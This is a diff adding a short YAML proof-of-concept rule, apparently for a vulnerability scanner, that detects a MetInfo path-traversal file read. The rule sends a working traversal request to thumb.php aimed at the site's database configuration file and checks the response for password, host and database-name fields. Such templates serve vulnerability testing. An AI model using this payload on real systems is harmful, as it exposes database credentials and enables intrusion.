@@ -1,0 +1,15 @@
+name: poc-yaml-metinfo-file-read
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /include/thumb.php?dir=http/.....///.....///config/config_db.php
+        expression: response.status == 200 && response.body.bcontains(b"con_db_pass") && response.body.bcontains(b"con_db_host") && response.body.bcontains(b"con_db_name")
+expression: r0()
+detail:
+    author: amos1
+    links:
+        - https://www.cnblogs.com/-qing-/p/10889467.html
